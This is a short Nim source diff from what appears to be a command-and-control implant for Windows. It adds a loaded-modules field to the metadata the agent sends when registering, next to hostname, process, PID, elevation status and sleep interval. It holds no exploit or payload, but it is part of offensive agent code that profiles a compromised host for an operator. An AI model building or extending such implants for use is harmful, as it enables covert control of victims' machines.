@@ -1,6 +1,7 @@
 import winim, os, net, strformat, strutils, registry, zippy
 
 import ../../common/[types, serialize, sequence, crypto, utils]
+import ../../modules/manager
 
 # Hostname/Computername
 proc getHostname(): string = 
@@ -217,7 +218,8 @@ proc collectAgentMetadata*(ctx: AgentCtx): AgentRegistrationData =
             process: string.toBytes(getProcessExe()),
             pid: cast[uint32](getProcessId()),
             isElevated: cast[uint8](isElevated()),
-            sleep: cast[uint32](ctx.sleep)
+            sleep: cast[uint32](ctx.sleep),
+            modules: cast[uint32](MODULES)
         )
     )
 
@@ -237,6 +239,7 @@ proc serializeRegistrationData*(ctx: AgentCtx, data: var AgentRegistrationData):
         .add(data.metadata.pid)
         .add(data.metadata.isElevated)
         .add(data.metadata.sleep)
+        .add(data.metadata.modules)
 
     let metadata = packer.pack()
     packer.reset()
